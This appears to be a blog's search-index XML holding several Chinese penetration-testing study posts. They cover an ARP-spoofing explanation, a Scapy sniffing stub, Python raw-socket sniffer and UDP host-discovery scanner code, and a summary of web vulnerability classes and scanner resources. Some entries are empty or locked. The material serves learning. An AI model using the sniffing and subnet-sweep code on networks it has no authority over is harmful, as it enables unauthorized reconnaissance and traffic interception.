    <title><![CDATA[arp攻击回顾]]></title>
    <url>%2F2019%2F08%2F23%2Farp%E6%94%BB%E5%87%BB%E5%9B%9E%E9%A1%BE%2F</url>
    <content type="text"><![CDATA[ARP简介arp是作用于数据链路层，是用来它获取设备的mac地址的。arp mac地址部分为ff:ff:ff:ff:ff:ff为广播地址，表示询问ip的mac地址。 ARP攻击针对apr的攻击最多的还是 arp中间人欺骗，利用大量的arp报文发送给目标机器，将目标主机的arp缓存表中网关地址mac修改为自己的mac地址，抓包嗅探再发送给网关。将网关arp缓存表中攻击地址mac改为自己的mac地址，看完以后再发送给目标服务器。 攻击代码12]]></content>
      <categories>
        <category>知识回顾</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Scapy介绍]]></title>
    <url>%2F2019%2F08%2F21%2FScapy%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[scapy 是一款python网络类库，这款库是我们一定要掌握的。 scapy linux支持比较完善，windows也是ok。 窃取Email认证1234567from scapy.all import *def packet_callback(packet): print packet.show() sniff(prn = packet_callback, count = 1)]]></content>
      <categories>
        <category>学习心得</category>
      </categories>
      <tags>
        <tag>网络爬虫</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python网络：原始套接字和流量嗅探]]></title>
    <url>%2F2019%2F08%2F18%2Fpython%E7%BD%91%E7%BB%9C%EF%BC%9A%E5%8E%9F%E5%A7%8B%E5%A5%97%E6%8E%A5%E5%AD%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%97%85%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[开发UDP主机发现工具嗅探工具的主要目标是基于UDP发现目标网络中的存活主机。攻击者需要了解网络中所有潜在的目标便于开展侦察和漏洞攻击尝试。 当你发送一个UDP数据包到主机的某个关闭的UDP端口上时，目标主机通常会返回一个ICMP包指示目标端口不可达。这样其实就说明了这个ip是存活的，因为ip是不存在的话，是不会有任何响应的。 接下来还有一点要注意，我们必须选择到一个未被使用的UDP端口才行，因为发送到活动端口也不一定会有响应回复给你，为了达到覆盖的范围，我们可以探查多个端口的响应情况，避免正好将数据发送到活动的UDP服务上。 为啥用UDP？因为UDP很简单，不用分析各种上层协议，就发送+等待。 Windows和Linux上的包嗅探示例代码： 12345678910111213141516171819202122import socketimport oshost = "192.168.66.190"# 判断是否为windows，windows可以抓任意协议的包，linux只能抓ICMPif os.name == "nt": socket_protocol = socket.IPPROTO_IPelse: socket_protocol = socket.IPPROTO_ICMP# 配置套接字属性 sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# set socket option sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# 系统为windows，则开启混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) print sniffer.recvfrom(65565)# 系统为windows，则关闭混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 以上代码只是抓一个包，windows可以抓到发送包，而运行在linux上的话，只能抓到ICMP包。 解码IP层我们接下来要解析一下ip层的报文结构 我们要解析全部IP头，提取其中的协议类型，源IP地址和目的IP地址。 Python中ctypes模块创建类似于C的结构体，我们可以用这种方式对头部成分进行定义。 IP头部在c语言中的定义： 12345678910111213struct ip &#123; u_char ip_v:4; u_char ip_h1:4; u_char ip_tos; u_short ip_len; u_short ip_id; u_short ip_off; u_char ip_ttl; u_char ip_p; u_short ip_sum; u_long ip_src; u_long ip_dst;&#125; 我们将上面c代码带入到上面python代码中（sniffer_ip_header_decode.py）: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# -*- coding: UTF-8 -*-import socketimport os### 新 加 ####import structfrom ctypes import *##############host = "192.168.66.190"#########################################################class IP(Structure): _fields_ = [ ("version", c_ubyte, 4), ("ih1", c_ubyte, 4), ("tos", c_ubyte), ("len", c_ushort), ("id", c_ushort), ("offset", c_ushort), ("ttl", c_ubyte), ("protocol_num", c_ubyte), ("sum", c_ushort), ("src", c_ulong), ("dst", c_ulong) ] def __new__(self, socket_buffer = None): return self.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer = None): self.protocol_map = &#123;1:"ICMP", 6:"TCP", 17:"UDP"&#125; self.src_address = socket.inet_ntoa(struct.pack("&lt;L",self.src)) self.dst_address = socket.inet_ntoa(struct.pack("&lt;L",self.dst)) try: self.protocol = self.protocol_map[self.protocol_num] except: self.protocol = str(self.protocol_num)####################################################################### 判断是否为windows，windows可以抓任意协议的包，linux只能抓ICMPif os.name == "nt": socket_protocol = socket.IPPROTO_IPelse: socket_protocol = socket.IPPROTO_ICMP# 配置套接字属性 sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# set socket option sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# 系统为windows，则开启混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) ####################### try: while True: raw_buffer = sniffer.recvfrom(65565)[0] ip_header = IP(raw_buffer[0:20]) print "Protocol: %s *** %s -&gt; %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address)except KeyboardInterrupt, e: print e############# #print sniffer.recvfrom(65565)# 系统为windows，则关闭混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# -*- coding: UTF-8 -*-import socketimport os### 新 加 ####import structfrom ctypes import *##############host = "192.168.66.190"####################### IP CLASS ##############################class IP(Structure): _fields_ = [ ("ih1", c_ubyte, 4), ("version", c_ubyte, 4), ("tos", c_ubyte), ("len", c_ushort), ("id", c_ushort), ("offset", c_ushort), ("ttl", c_ubyte), ("protocol_num", c_ubyte), ("sum", c_ushort), ("src", c_ulong), ("dst", c_ulong) ] def __new__(self, socket_buffer = None): return self.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer = None): self.protocol_map = &#123;1:"ICMP", 6:"TCP", 17:"UDP"&#125; self.src_address = socket.inet_ntoa(struct.pack("&lt;L",self.src)) self.dst_address = socket.inet_ntoa(struct.pack("&lt;L",self.dst)) try: self.protocol = self.protocol_map[self.protocol_num] except: self.protocol = str(self.protocol_num)################################################################################ ICMP CLASS ############################################class ICMP(Structure): _fields_ = [ ("type", c_ubyte), ("code", c_ubyte), ("checksum", c_ushort), ("unused", c_ushort), ("next_hop_mtu", c_ushort) ] def __new__(self, socket_buffer): return self.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): pass ##################################################################### 判断是否为windows，windows可以抓任意协议的包，linux只能抓ICMPif os.name == "nt": socket_protocol = socket.IPPROTO_IPelse: socket_protocol = socket.IPPROTO_ICMP# 配置套接字属性 sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# set socket option sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# 系统为windows，则开启混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) ####################### try: while True: raw_buffer = sniffer.recvfrom(65565)[0] ip_header = IP(raw_buffer[0:20]) print "Protocol: %s *** %s -&gt; %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address) if ip_header.protocol == "ICMP": offset = ip_header.ih1 * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] icmp_header = ICMP(buf) print "ICMP —&gt; TYPE: %d CODE: %d" % (icmp_header.type, icmp_header.code)except KeyboardInterrupt, e: print e############# #print sniffer.recvfrom(65565)# 系统为windows，则关闭混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 计算IP头部长度，直接用报文中的头部长度 乘以 4 个字节。 接下来，我们再把扫描模块给写完： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125# -*- coding: UTF-8 -*-import threadingimport socketimport osimport timefrom netaddr import IPNetwork, IPAddress### 新 加 ####import structfrom ctypes import *##############host = "192.168.66.190"subnet = "192.168.66.0/24"### include ICMP responce body ###magic_message = "PYTHONRULES!"def udp_sender(subnet, magic_message): time.sleep(5) sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for ip in IPNetwork(subnet): try: sender.sendto(magic_message, ("%s" % ip, 65212)) except: pass ####################### IP CLASS ##############################class IP(Structure): _fields_ = [ ("ih1", c_ubyte, 4), ("version", c_ubyte, 4), ("tos", c_ubyte), ("len", c_ushort), ("id", c_ushort), ("offset", c_ushort), ("ttl", c_ubyte), ("protocol_num", c_ubyte), ("sum", c_ushort), ("src", c_ulong), ("dst", c_ulong) ] def __new__(self, socket_buffer = None): return self.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer = None): self.protocol_map = &#123;1:"ICMP", 6:"TCP", 17:"UDP"&#125; self.src_address = socket.inet_ntoa(struct.pack("&lt;L",self.src)) self.dst_address = socket.inet_ntoa(struct.pack("&lt;L",self.dst)) try: self.protocol = self.protocol_map[self.protocol_num] except: self.protocol = str(self.protocol_num)################################################################################ ICMP CLASS ############################################class ICMP(Structure): _fields_ = [ ("type", c_ubyte), ("code", c_ubyte), ("checksum", c_ushort), ("unused", c_ushort), ("next_hop_mtu", c_ushort) ] def __new__(self, socket_buffer): return self.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): pass ####################################################################t = threading.Thread(target = udp_sender, args = (subnet, magic_message))t.start()# 判断是否为windows，windows可以抓任意协议的包，linux只能抓ICMPif os.name == "nt": socket_protocol = socket.IPPROTO_IPelse: socket_protocol = socket.IPPROTO_ICMP# 配置套接字属性 sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)sniffer.bind((host, 0))# set socket option sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)# 系统为windows，则开启混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) ####################### try: while True: raw_buffer = sniffer.recvfrom(65565)[0] ip_header = IP(raw_buffer[0:20]) print "Protocol: %s *** %s -&gt; %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address) if ip_header.protocol == "ICMP": offset = ip_header.ih1 * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] icmp_header = ICMP(buf) print "ICMP -&gt; TYPE: %d CODE: %d" % (icmp_header.type, icmp_header.code) if icmp_header.code == 3 and icmp_header.type == 3: if raw_buffer[len(raw_buffer)-len(magic_message):] == magic_message: print "Host Up: %s" % ip_header.src_addressexcept KeyboardInterrupt, e: print e############# #print sniffer.recvfrom(65565)# 系统为windows，则关闭混杂模式if os.name == "nt": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)]]></content>
      <categories>
        <category>python编程</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>网络编程</tag>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[欺骗的艺术]]></title>
    <url>%2F2019%2F07%2F28%2F%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[一.]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[半年学习心得]]></title>
    <url>%2F2019%2F07%2F11%2F%E5%8D%8A%E5%B9%B4%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[学习心得做渗透也有大半年了，还是需要写点东西总结一下。在前面几个月主要是web渗透，也算是把大学后期的知识复习了一下，算是比较简单的。 web渗透web渗透很多，网上更是很多思维导图，这里就用列表简单叙述一下： SQL注入（高危）： 对于参数检查不严格（不仅仅是用户可输入部分），恶意参数放入sql语句中得到执行，作用对象为web层调用后的数据库。 XSS（存储性高危，反射型为低危）： 同样因用户输入过滤不严格导致代码在前端js执行，由于是js执行，效果范围有限，一般来说可以盗取cookie，若客户端主机上浏览器或第三方插件存在漏洞，可以通过漏洞控制客户端主机。 越权（数据泄露属于高危）： 水平越权和垂直越权，一般来说水平权限容易忽略，修改一下参数中的id值，即可检查出来。 文件上传（结合最后利用，严重可获取数据并获得服务器权限）： 文件上传在ctf中考察比较多，上传木马再加上web服务启动的高权限，攻击者可以获取服务器权限。 命令执行（视 web执行权限而定）： 由于过滤不严格，参数可以当作代码使用，执行相应命令，若权限较高，则可以执行任意命令。 文件包含，远程文件包含（高危）： 让用户，或者公开入口引用文件，并执行了，可用于挂载本身目录无执行权限的文件和外来网站文件，可getshell。 密码、随机数不安全（使用一些并强度不是很高，并容易猜解的密码）： 比如数据库使用md5存储密码，或重要信息加密时，模式使用ECB等容易猜解的模式。随机数比较简单，容易猜解。遇到这种情况概率比较低，不过若能破解，则可以达到不错的效果。 变量覆盖（视入侵情况而定 ）： 一些全局变量覆盖后，会产生不一样的效果，可能越权执行更多功能。 更多 扫描器一般来说，简单web应用，有一些特色字符套用可以直接检查出来，如果将参数过滤了，也需要遍历各种绕过姿势找到绕过方法。所以自动化填充对一个web狗来说相当重要，也是我下一步安全方向的目标之一。 目前扫描器的了解不是很多，看了几个ppt，传统扫描器的原理和上述一样，不知道会不会有“下一代扫描器”，哈哈哈哈。 这里介绍一下扫描器需要发现的常用漏洞，和上述的漏洞结构分类不同。 信息泄露： 配置文件，测试文件，目录遍历，备份文件，SVN，GIT，压缩包，临时文件，接口暴露，心脏滴血等 错误配置： WebServer配置失误，中间件配置失误，容器配置失误 前端漏洞： XSS；CSRF；ClickJacking；Jsonp劫持；HTTP头注入CRLF；URL跳转 弱口令： SSH，FTP等 WEB注入漏洞： SQL注入，命令注入，代码注入，SSR网络漏洞，表达式注入，JAVA EL表达式注入命令执行，发序列化漏洞，XPATH注入 文件包含漏洞： 任意文件读取，任意文件上传，XXE，任意文件删除 逻辑漏洞： jsonp数据劫持，身份认证安全，验证码限制绕过，业务一致性安全，业务数据篡改，认证权限找回逻辑，业务流程乱序，业务接口调用安全 简单编写扫描器，使用脚本调用脚本，各种指纹等特征信息作为可配置文件标准化入库 记录一下各种扫描器的文章链接：https://github.com/boy-hack（京东同事） https://x.hacking8.com/ （京东同事个人网站） https://www.freebuf.com/sectool/162120.html（扫描器开发笔记，可看） https://github.com/lijiejie/BBScan（简单的遍历扫描器） https://github.com/We5ter/Scanners-Box（开源扫描器合辑） https://github.com/0xbug/Hawkeye（github监控平台） https://github.com/0xbug/SQLiScanner（集成sqlmap可视化） https://www.freebuf.com/sectool/176562.html（刷SRC经验之批量化扫描实践） https://github.com/boy-hack/poc-t（遍历脚本） 平台集成思路（网上的） （注：扫描器很考验安全人员编程能力） 数据分析（日志分析）我接触过的数据分析主要是日志分析，根据各种各样的系统中出现的异常日志，进行关联分析，当时初学时使用的是es6.0版本，那时的es并不支持直接的关联查询，没有mysql的表关联功能，关联逻辑只能自己写。 日志收集分析的框架主要就是那么几种，没有很多变化， https://mp.weixin.qq.com/s/K44-L0rclaIM40hma55pPQ（多es集群参考实践） 我对日志收集分析的了解大多还是基于理论，实践经验不是很多。 在少量实践中，我发现最重要的还是规划问题，估计的每日日志量，预留日志量，保留天数等都需要合适的计算。 而且，在系统运行过程中就算是es也会出现各种高可用及性能问题，简单说，日志收集这一块很难做成非单点的，日志收集的完整性也得不到保障，这是日志收集工作出现的问题。 在日志分析中，由于日志的种类多种多样，需要花费大量人力和时间解析日志。同时，需要理解日志含义，决定日志是否存入es中进行处理。我觉得最少在操作系统层面，有很多日志无需录入es，为满足合规规定，用文本形式存储在日志存储服务器中即可，毕竟高配机还是很贵的。 上面说的是日志的问题，还有查询的问题，由于es就不是关系型数据库，就没有关联关系，所以关联关系需要自己根据场景自己进行自己开发。出了上述说的自己写关联关系，还有一种方法，利用es的特性——只能条条查询来完成所谓的关联：将符合某些条件所有日志都查出来放入一个索引中，再进行进一步查询或拉出来再封装一个索引，以数量是否符合正常值为判断标准（只能完成一些简单的关联逻辑）。 对了，还得提一下，在解析的时候，字段名称和索引名称需要使用统一规范进行固定，避免以后不必要的麻烦。 展示阶段，kibana的使用到无太多技巧，如何好看，如何展示，是门艺术，暂时不讲。 除了上述中使用es套件对日志进行猜解外，还有其他很多好用的脚本可以对日志进行简单分析，场景为应急的时候，效率比es套件来的高，思路也更清晰。 最常用的手段，就是linux的awk，grep等过滤命令。具体的另外有笔记记载。 SDL流程这半年来，我除了做一些安全测试以外，也思考了一下SDL的流程，SDL主要是为了在开发流程中对各个角色（产品，研发，测试，安全）进行提醒，注意安全相关问题，并给出相应的指导意见和注意事项。架构上的安全，我个人其实不太觉得属于SDL。当然，项目初期，安全团队肯定需要对架构进行安全评审。现在SDL不比原来，没有一个统一注意事项，现在SDL注意事项提醒和要求，完全可以按照《网络安全法》，《网络安全等级保护要求》及《网站经营要求》来进行设定。 具体表格也另外有笔记记录。]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>知识介绍</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit 笔记（二）]]></title>
    <url>%2F2019%2F07%2F11%2Fmetasploit-%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit 笔记（一）]]></title>
    <url>%2F2019%2F07%2F11%2Fmetasploit-%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[欢迎来到我的博客，请输入密码进行阅读。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>工具技巧</tag>
      </tags>
  </entry>
</search>
